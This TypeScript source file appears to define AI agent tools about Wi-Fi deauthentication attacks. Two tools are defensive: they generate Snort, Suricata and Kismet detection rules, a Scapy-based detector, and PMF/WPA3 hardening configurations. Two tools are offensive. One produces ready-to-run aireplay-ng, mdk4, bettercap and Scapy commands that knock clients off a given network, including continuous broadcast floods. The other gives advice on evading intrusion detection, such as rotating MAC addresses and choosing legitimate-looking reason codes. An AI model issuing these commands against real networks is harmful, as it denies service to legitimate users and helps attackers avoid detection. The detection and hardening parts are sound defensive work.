import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { WIFI_ATTACKS } from "../knowledge/index.js";

const deauth_analyze: ToolDef = {
  name: "deauth_analyze",
  description: "Analyze deauthentication attack feasibility against a target network. Evaluates PMF status, frequency band, and EDR/WIDS presence to determine attack viability.",
  schema: {
    target_pmf: z.enum(["enabled", "disabled"]).describe("PMF (802.11w) status on target network"),
    target_band: z.enum(["2.4", "5", "6"]).describe("Target frequency band in GHz"),
    edr_present: z.boolean().describe("Whether endpoint detection/WIDS is present"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const pmf = args.target_pmf as string;
    const band = args.target_band as string;
    const edrPresent = args.edr_present as boolean;

    const pmfBlocks = pmf === "enabled";

    let feasibility: string;
    let score: number; // 0-10
    const tools: string[] = [];
    const techniques: { name: string; description: string; effective: boolean; reason: string }[] = [];

    // Standard deauth
    techniques.push({
      name: "802.11 Deauthentication Frame",
      description: "Send forged deauth frames (reason code 7 or 6)",
      effective: !pmfBlocks,
      reason: pmfBlocks
        ? "PMF protects management frames - deauth frames will be rejected"
        : "Management frames are unprotected - deauth will succeed",
    });

    if (!pmfBlocks) {
      tools.push("aireplay-ng", "mdk4", "bettercap", "scapy");
    }

    // Disassociation
    techniques.push({
      name: "802.11 Disassociation Frame",
      description: "Send forged disassociation frames (alternative to deauth)",
      effective: !pmfBlocks,
      reason: pmfBlocks
        ? "PMF also protects disassociation frames"
        : "Disassociation frames are unprotected",
    });

    // CSA Attack
    techniques.push({
      name: "Channel Switch Announcement (CSA)",
      description: "Force channel migration via forged CSA frames",
      effective: !pmfBlocks,
      reason: pmfBlocks
        ? "PMF protects CSA action frames in most implementations"
        : "CSA action frames can redirect clients to unused channel",
    });

    if (!pmfBlocks) {
      tools.push("mdk4 w mode");
    }

    // SA Query Bypass (PMF)
    if (pmfBlocks) {
      techniques.push({
        name: "SA Query Timeout Exploitation",
        description: "Attempt to exploit SA Query mechanism timeout or race condition",
        effective: false,
        reason: "SA Query is designed to prevent this. Only works against buggy implementations.",
      });

      techniques.push({
        name: "PMF Downgrade via Beacon Spoofing",
        description: "Advertise same SSID without PMF to capture clients that don't strictly require PMF",
        effective: true,
        reason: "Works only if client has PMF set to 'optional' rather than 'required'",
      });
      tools.push("hostapd", "scapy");

      techniques.push({
        name: "Authentication Flood (not deauth)",
        description: "Flood AP with authentication requests to exhaust association table",
        effective: true,
        reason: "Authentication frames are not protected by PMF",
      });
      tools.push("mdk4 a mode");
    }

    // RF jamming (always works but illegal)
    techniques.push({
      name: "RF Jamming",
      description: "Physical layer jamming of the target frequency",
      effective: true,
      reason: "Physical layer attack bypasses all protocol protections including PMF",
    });

    // Band-specific considerations
    const bandNotes: Record<string, string[]> = {
      "2.4": [
        "2.4GHz: Higher range, deauth effective at greater distances",
        "More crowded spectrum - deauth may affect other networks",
        "Most IoT devices operate on 2.4GHz",
        "Lower power needed for effective deauth",
      ],
      "5": [
        "5GHz: Shorter range, need closer proximity for deauth",
        "DFS channels (52-144) may complicate attack - radar detection",
        "Less interference from other devices",
        "Some client adapters have limited 5GHz monitor mode support",
      ],
      "6": [
        "6GHz (WiFi 6E): Very short range, requires close proximity",
        "WPA3 mandatory - PMF always enabled",
        "Limited tool support for 6GHz monitor mode",
        "Newer hardware required for both target and attacker",
      ],
    };

    // Calculate overall feasibility
    if (pmfBlocks && edrPresent) {
      feasibility = "VERY LOW";
      score = 2;
    } else if (pmfBlocks) {
      feasibility = "LOW";
      score = 3;
    } else if (edrPresent) {
      feasibility = "MEDIUM";
      score = 5;
    } else {
      feasibility = "HIGH";
      score = 8;
    }

    if (band === "6") {
      score = Math.max(1, score - 2);
      feasibility = score <= 3 ? "LOW" : feasibility;
    }

    const deauthAttack = WIFI_ATTACKS.find((a) => a.id === "deauth");

    return json({
      deauth_feasibility: {
        feasibility,
        score: `${score}/10`,
        pmf_status: pmf,
        pmf_blocks_deauth: pmfBlocks,
        target_band: `${band}GHz`,
        edr_wids_present: edrPresent,
        techniques,
        available_tools: [...new Set(tools)],
        band_considerations: bandNotes[band] || [],
        edr_evasion: edrPresent ? [
          "Use targeted deauth (single client) instead of broadcast",
          "Send minimal deauth frames (1-3) with delays between",
          "Rotate source MAC to avoid pattern detection",
          "Time attacks during high-traffic periods for cover",
          "Use reason codes that appear legitimate (e.g., 'AP is unable to handle all currently associated STAs')",
        ] : ["No WIDS/EDR detected - standard deauth techniques viable"],
        alternative_approaches: pmfBlocks ? [
          "Use PMKID attack (clientless, no deauth needed)",
          "Wait for natural client reconnection to capture handshake",
          "Evil Twin with stronger signal - clients may roam voluntarily",
          "Authentication flood to exhaust AP association table (DoS)",
          "Physical layer jamming (requires specialized hardware, may be illegal)",
        ] : undefined,
        kb_reference: deauthAttack ? {
          id: deauthAttack.id,
          name: deauthAttack.name,
          mitigations: deauthAttack.mitigations,
        } : undefined,
      },
    });
  },
};

const deauth_detect: ToolDef = {
  name: "deauth_detect",
  description: "Generate deauthentication attack detection rules for WIDS/WIPS platforms. Provides platform-specific signatures and alerting configuration.",
  schema: {
    wids_platform: z.enum(["Kismet", "Snort", "Suricata", "custom"]).describe("WIDS/WIPS platform for rule generation"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const platform = args.wids_platform as string;

    const rules: Record<string, unknown> = {};

    switch (platform) {
      case "Kismet":
        rules.platform = "Kismet";
        rules.config_file = "kismet.conf";
        rules.rules = [
          {
            name: "DEAUTHFLOOD",
            description: "Detect deauthentication frame flood",
            config: "alert=DEAUTHFLOOD,10/min,2/sec",
            explanation: "Alert when >10 deauth frames/min or >2 deauth frames/sec from same source",
          },
          {
            name: "DISASSOCFLOOD",
            description: "Detect disassociation frame flood",
            config: "alert=DISASSOCFLOOD,10/min,2/sec",
            explanation: "Alert when >10 disassoc frames/min from same source",
          },
          {
            name: "BSSTIMESTAMP",
            description: "Detect BSS timestamp anomalies (rogue AP indicator)",
            config: "alert=BSSTIMESTAMP,5/min,1/sec",
            explanation: "TSF timestamp mismatch indicates cloned/rogue AP",
          },
          {
            name: "APSPOOF",
            description: "Detect AP spoofing (same SSID, different BSSID/params)",
            config: "alert=APSPOOF,5/min,1/sec",
            explanation: "Known SSID from unauthorized BSSID",
          },
          {
            name: "CHANCHANGE",
            description: "Detect CSA (Channel Switch Announcement) attacks",
            config: "alert=CHANCHANGE,5/min,1/sec",
            explanation: "Unexpected channel switch announcements",
          },
        ];
        rules.deployment = [
          "kismet -c wlan0mon  # Start monitoring",
          "kismet --override kismet_alerts.conf  # Load custom alerts",
          "# Configure kismet_httpd.conf for remote monitoring dashboard",
        ];
        break;

      case "Snort":
        rules.platform = "Snort";
        rules.config_file = "local.rules";
        rules.rules = [
          {
            name: "Deauth Flood Detection",
            rule: 'alert wifi any any -> any any (msg:"WiFi Deauth Flood Detected"; wifi.type:0; wifi.subtype:12; threshold:type both, track by_src, count 10, seconds 10; classtype:denial-of-service; sid:3000001; rev:1;)',
            explanation: "Alert on >10 deauth frames from same source in 10 seconds",
          },
          {
            name: "Disassociation Flood",
            rule: 'alert wifi any any -> any any (msg:"WiFi Disassoc Flood Detected"; wifi.type:0; wifi.subtype:10; threshold:type both, track by_src, count 10, seconds 10; classtype:denial-of-service; sid:3000002; rev:1;)',
            explanation: "Alert on >10 disassoc frames from same source in 10 seconds",
          },
          {
            name: "Broadcast Deauth",
            rule: 'alert wifi any any -> FF:FF:FF:FF:FF:FF any (msg:"WiFi Broadcast Deauth Detected"; wifi.type:0; wifi.subtype:12; classtype:denial-of-service; sid:3000003; rev:1;)',
            explanation: "Alert on any broadcast deauth frame (common in deauth attacks)",
          },
        ];
        rules.deployment = [
          "# Add to /etc/snort/rules/local.rules",
          "# Requires Snort with WiFi preprocessor support",
          "snort -c /etc/snort/snort.conf -i wlan0mon",
        ];
        break;

      case "Suricata":
        rules.platform = "Suricata";
        rules.config_file = "local.rules";
        rules.rules = [
          {
            name: "Deauth Flood Detection",
            rule: 'alert wifi any any -> any any (msg:"WiFi Deauth Flood"; wifi.type:0; wifi.subtype:12; threshold:type threshold, track by_src, count 10, seconds 10; sid:4000001; rev:1;)',
            explanation: "Suricata threshold-based deauth detection",
          },
          {
            name: "Auth Flood Detection",
            rule: 'alert wifi any any -> any any (msg:"WiFi Auth Flood"; wifi.type:0; wifi.subtype:11; threshold:type threshold, track by_src, count 50, seconds 10; sid:4000002; rev:1;)',
            explanation: "Detect authentication frame flood (PMF bypass technique)",
          },
        ];
        rules.deployment = [
          "# Add to /etc/suricata/rules/local.rules",
          "# Requires Suricata with WiFi protocol support",
          "suricata -c /etc/suricata/suricata.yaml -i wlan0mon",
        ];
        break;

      case "custom":
        rules.platform = "Custom (Python/Scapy)";
        rules.rules = [
          {
            name: "Python Scapy Deauth Detector",
            code: [
              "#!/usr/bin/env python3",
              "from scapy.all import *",
              "from collections import defaultdict",
              "import time",
              "",
              "deauth_count = defaultdict(lambda: {'count': 0, 'first_seen': 0})",
              "THRESHOLD = 10  # deauths per window",
              "WINDOW = 10     # seconds",
              "",
              "def detect_deauth(pkt):",
              "    if pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):",
              "        src = pkt.addr2 or 'unknown'",
              "        now = time.time()",
              "        entry = deauth_count[src]",
              "        if now - entry['first_seen'] > WINDOW:",
              "            entry['count'] = 0",
              "            entry['first_seen'] = now",
              "        entry['count'] += 1",
              "        if entry['count'] >= THRESHOLD:",
              "            frame_type = 'Deauth' if pkt.haslayer(Dot11Deauth) else 'Disassoc'",
              "            print(f'[ALERT] {frame_type} flood from {src}: {entry[\"count\"]} frames in {WINDOW}s')",
              "            print(f'  Target: {pkt.addr1}  Reason: {pkt.reason}')",
              "",
              "sniff(iface='wlan0mon', prn=detect_deauth, store=0)",
            ],
            explanation: "Standalone Python script using Scapy for deauth detection",
          },
        ];
        rules.deployment = [
          "pip install scapy",
          "python3 deauth_detector.py",
          "# Requires monitor mode interface",
        ];
        break;
    }

    return json({
      deauth_detection: {
        ...rules,
        general_detection_indicators: [
          "Sudden spike in deauthentication frames (>10/sec)",
          "Deauth frames with broadcast destination (FF:FF:FF:FF:FF:FF)",
          "Deauth source MAC not matching any authorized AP",
          "Deauth bursts correlated with new AP appearance (Evil Twin setup)",
          "Reason codes 6 or 7 in rapid succession",
          "Deauth from multiple source MACs (MAC rotation evasion)",
        ],
        response_procedures: [
          "1. Alert security team immediately",
          "2. Identify source direction using RF triangulation",
          "3. Enable deauth containment on WLC (if supported)",
          "4. Check for rogue APs that appeared during deauth activity",
          "5. Document frame captures for forensic analysis",
          "6. Consider enabling PMF if not already active",
        ],
      },
    });
  },
};

const deauth_commands: ToolDef = {
  name: "deauth_commands",
  description: "Generate deauthentication attack commands for various tools. Returns ready-to-use commands with parameters filled in.",
  schema: {
    target_bssid: z.string().describe("Target AP BSSID (e.g. 'AA:BB:CC:DD:EE:FF')"),
    client_mac: z.string().optional().describe("Specific client MAC to deauth (omit for broadcast)"),
    interface: z.string().optional().describe("Monitor mode interface (default: wlan0mon)"),
    count: z.number().optional().describe("Number of deauth frames to send (0 = continuous)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const bssid = args.target_bssid as string;
    const clientMac = args.client_mac as string | undefined;
    const iface = (args.interface as string) || "wlan0mon";
    const count = (args.count as number) ?? 10;

    const isTargeted = !!clientMac;
    const clientArg = clientMac || "FF:FF:FF:FF:FF:FF";

    const commands = {
      setup: [
        { tool: "airmon-ng", command: `airmon-ng check kill`, description: "Kill interfering processes" },
        { tool: "airmon-ng", command: `airmon-ng start ${iface.replace("mon", "")}`, description: "Enable monitor mode" },
      ],
      aireplay_ng: {
        tool: "aireplay-ng (aircrack-ng suite)",
        commands: [
          {
            command: `aireplay-ng -0 ${count} -a ${bssid}${isTargeted ? ` -c ${clientMac}` : ""} ${iface}`,
            description: isTargeted
              ? `Send ${count} deauth frames to specific client ${clientMac}`
              : `Send ${count} broadcast deauth frames to all clients on ${bssid}`,
          },
          count === 0 ? {
            command: `aireplay-ng -0 0 -a ${bssid}${isTargeted ? ` -c ${clientMac}` : ""} ${iface}`,
            description: "Continuous deauth (press Ctrl+C to stop)",
          } : null,
        ].filter(Boolean),
      },
      mdk4: {
        tool: "mdk4",
        commands: [
          {
            command: `mdk4 ${iface} d -B ${bssid}${isTargeted ? ` -S ${clientMac}` : ""}`,
            description: "Deauth flood using mdk4",
          },
          {
            command: `mdk4 ${iface} d -B ${bssid} -c 1,6,11`,
            description: "Multi-channel deauth (channels 1, 6, 11)",
          },
        ],
      },
      bettercap: {
        tool: "bettercap",
        commands: [
          {
            command: `bettercap -iface ${iface} -eval "wifi.recon on; wifi.deauth ${bssid}"`,
            description: "Deauth via bettercap WiFi module",
          },
        ],
      },
      scapy: {
        tool: "scapy (Python)",
        commands: [
          {
            command: [
              "python3 -c \"",
              "from scapy.all import *",
              `pkt = RadioTap()/Dot11(type=0, subtype=12, addr1='${clientArg}', addr2='${bssid}', addr3='${bssid}')/Dot11Deauth(reason=7)`,
              `sendp(pkt, iface='${iface}', count=${count || 100}, inter=0.1)`,
              "\"",
            ].join("\n"),
            description: "Custom deauth using Scapy (reason code 7: Class 3 frame from non-associated STA)",
          },
        ],
      },
    };

    return json({
      deauth_commands: {
        target_ap: bssid,
        target_client: clientMac || "broadcast (all clients)",
        interface: iface,
        frame_count: count === 0 ? "continuous" : count,
        attack_type: isTargeted ? "Targeted (single client)" : "Broadcast (all clients)",
        stealth_note: isTargeted
          ? "Targeted deauth is stealthier - less likely to trigger WIDS alerts"
          : "Broadcast deauth is noisy - will likely trigger WIDS alerts",
        ...commands,
        cleanup: [
          { command: `airmon-ng stop ${iface}`, description: "Disable monitor mode" },
          { command: "systemctl restart NetworkManager", description: "Restore network manager" },
        ],
        warnings: [
          "Deauth attacks cause denial of service to legitimate users",
          "Only perform with explicit written authorization",
          "PMF (802.11w) will block deauth frames - verify PMF status first",
          "WIDS/WIPS systems will detect and alert on deauth floods",
        ],
      },
    });
  },
};

const deauth_defense: ToolDef = {
  name: "deauth_defense",
  description: "Recommend comprehensive deauthentication attack defenses. Provides PMF deployment guide, WIDS configuration, and infrastructure hardening recommendations.",
  schema: {
    infrastructure: z.string().describe("Infrastructure description (AP vendor, count, current config - e.g. 'Cisco 9120AXI, 50 APs, WPA2-Enterprise, no PMF')"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const infra = (args.infrastructure as string).toLowerCase();

    const hasPMF = infra.includes("pmf") && !infra.includes("no pmf");
    const hasWPA3 = infra.includes("wpa3");
    const isEnterprise = infra.includes("enterprise") || infra.includes("802.1x");

    // Detect vendor
    let vendor = "generic";
    if (infra.includes("cisco")) vendor = "cisco";
    else if (infra.includes("ubiquiti") || infra.includes("unifi")) vendor = "ubiquiti";
    else if (infra.includes("aruba") || infra.includes("hpe")) vendor = "aruba";
    else if (infra.includes("meraki")) vendor = "meraki";
    else if (infra.includes("ruckus")) vendor = "ruckus";
    else if (infra.includes("fortinet") || infra.includes("fortiap")) vendor = "fortinet";

    const pmfGuide: Record<string, unknown> = {
      importance: "PMF (802.11w / Protected Management Frames) is the primary defense against deauth attacks",
      current_status: hasPMF ? "PMF appears to be enabled" : "PMF is NOT enabled - this is the #1 priority",
      deployment_steps: [
        "1. Inventory all client devices for 802.11w support",
        "2. Enable PMF in 'optional' mode first (compatible with non-PMF clients)",
        "3. Monitor for connection issues from legacy devices",
        "4. Migrate non-PMF devices or plan replacement",
        "5. Switch PMF to 'required' once all clients support it",
        "6. Consider WPA3 migration (PMF is mandatory in WPA3)",
      ],
    };

    // Vendor-specific PMF configuration
    const vendorConfig: Record<string, Record<string, unknown>> = {
      cisco: {
        platform: "Cisco WLC / Catalyst 9800",
        pmf_config: [
          "# Cisco WLC (AireOS)",
          "config wlan security pmf required <wlan_id>",
          "# or for optional mode:",
          "config wlan security pmf optional <wlan_id>",
          "",
          "# Cisco Catalyst 9800 (IOS-XE)",
          "wlan MyNetwork",
          "  security pmf mandatory",
          "  # or: security pmf optional",
        ],
        wids_config: [
          "config wps ap-authentication enable",
          "config wps rogue-ap-aaa enable",
          "config wps mfp ap enable",
          "config wps mfp client enable",
        ],
      },
      ubiquiti: {
        platform: "UniFi Controller",
        pmf_config: [
          "Settings > WiFi > [Network] > Security",
          "  PMF: Required (or Optional for compatibility)",
          "",
          "Or via API:",
          "PUT /api/s/default/rest/wlanconf/<id>",
          '  {"pmf_mode": "required"}  // or "optional" or "disabled"',
        ],
        wids_config: [
          "Settings > Threat Management > Enable IDS/IPS",
          "Settings > WiFi > Rogue AP Detection: Enable",
        ],
      },
      aruba: {
        platform: "Aruba (HPE)",
        pmf_config: [
          "wlan ssid-profile <name>",
          "  mfp-capable",
          "  mfp-required  # for mandatory PMF",
        ],
        wids_config: [
          "ids dos-profile default",
          "  deauth-rate-threshold 10",
          "  disassoc-rate-threshold 10",
          "ids general-profile default",
          "  rogue-ap-detection enable",
        ],
      },
      meraki: {
        platform: "Cisco Meraki",
        pmf_config: [
          "Dashboard > Wireless > Access Control",
          "  WPA encryption mode: WPA3 (includes mandatory PMF)",
          "  or WPA2 with 802.11w: Required",
        ],
        wids_config: [
          "Dashboard > Air Marshal > Configure",
          "  Enable threat detection and alerting",
          "  Set auto-containment policies",
        ],
      },
      generic: {
        platform: "Generic / hostapd",
        pmf_config: [
          "# hostapd.conf",
          "ieee80211w=2  # 0=disabled, 1=optional, 2=required",
          "group_mgmt_cipher=AES-128-CMAC",
        ],
        wids_config: [
          "# Deploy Kismet for WIDS",
          "kismet -c wlan0mon --override alerts",
        ],
      },
    };

    const config = vendorConfig[vendor] || vendorConfig.generic;

    return json({
      deauth_defense: {
        infrastructure: args.infrastructure,
        current_pmf: hasPMF,
        current_wpa3: hasWPA3,
        risk_level: hasPMF || hasWPA3 ? "LOW" : "HIGH",
        pmf_deployment: {
          ...pmfGuide,
          vendor_config: config,
        },
        additional_defenses: {
          wpa3_migration: {
            description: "WPA3 mandates PMF and provides additional protections",
            steps: [
              "Enable WPA3 transition mode (WPA2+WPA3) for compatibility",
              "Test all client devices with WPA3",
              "Eventually move to WPA3-only",
              isEnterprise ? "WPA3-Enterprise 192-bit for highest security" : "WPA3-SAE for personal/PSK networks",
            ],
          },
          wids_deployment: {
            description: "Deploy WIDS/WIPS for deauth detection and automated response",
            vendor_config: config.wids_config,
            detection_thresholds: {
              deauth_rate: "Alert on >10 deauth frames per second per source",
              disassoc_rate: "Alert on >10 disassoc frames per second per source",
              broadcast_deauth: "Alert on any broadcast deauth frame",
              rogue_ap: "Alert on SSID from unauthorized BSSID",
            },
          },
          network_architecture: [
            "Deploy APs with overlapping coverage for resilience",
            "Use band steering to prefer 5GHz (shorter deauth range)",
            "Segment guest and IoT networks",
            "Implement 802.11k/v/r for fast roaming without deauth",
          ],
          monitoring: [
            "Centralized logging of wireless events",
            "SIEM integration for correlation with other security events",
            "Automated alerting on deauth patterns",
            "Regular wireless security assessments",
          ],
        },
      },
    });
  },
};

export const deauthTools: ToolDef[] = [
  deauth_analyze,
  deauth_detect,
  deauth_commands,
  deauth_defense,
];
